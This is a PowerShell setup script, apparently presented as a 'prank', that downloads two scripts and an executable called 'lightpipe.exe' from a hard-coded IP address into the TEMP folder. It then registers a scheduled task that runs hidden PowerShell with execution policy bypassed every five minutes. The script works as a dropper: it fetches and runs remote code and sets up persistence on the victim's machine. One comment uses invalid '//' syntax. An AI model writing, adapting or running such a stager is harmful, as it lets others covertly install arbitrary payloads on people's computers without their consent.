# 1. Configuration - Replace these URLs with your actual file hosting links
$PrankUrl = "http://34.142.193.230/prank.ps1"
$RevertUrl = "http://34.142.193.230/revert_prank.ps1"
$PayloadURL = "http://34.142.193.230/lightpipe.exe"

# Local paths where the files will be saved
$ScriptDir = "$env:TEMP\PrankScripts"
$PrankPath = "$ScriptDir\prank.ps1"
$RevertPath = "$ScriptDir\revert_prank.ps1"
$PayloadPath = "$ScriptDir\lightpipe.exe" // Adjusted to match the filename you want the payload to be

# Ensure the directory exists
if (!(Test-Path $ScriptDir)) {
    New-Item -ItemType Directory -Path $ScriptDir | Out-Null
}

# 2. Download the scripts
Write-Host "Downloading components..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $PrankUrl -OutFile $PrankPath -ErrorAction Stop
    Invoke-WebRequest -Uri $RevertUrl -OutFile $RevertPath -ErrorAction Stop
    Invoke-WebRequest -Uri $PayloadURL -OutFile $PayloadPath -ErrorAction Stop
    Write-Host "Downloads complete." -ForegroundColor Green
}
catch {
    Write-Error "Failed to download scripts. Check your URLs."
    exit
}

# 3. Create the Scheduled Task
Write-Host "Setting up the schedule..." -ForegroundColor Cyan
$TaskName = "Dom_USB_Hardware_Prank"
$ActionCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File '$PrankPath'"

# Create the task to run every 5 minutes
schtasks /F /CREATE /TN $TaskName /tr $ActionCmd /sc minute /mo 5

# 4. Trigger the first run immediately so you don't have to wait 5 minutes
Write-Host "Starting the first instance..." -ForegroundColor Yellow
schtasks /run /tn $TaskName

Write-Host "Setup finished. Revert script is saved at: $RevertPath" -ForegroundColor Magenta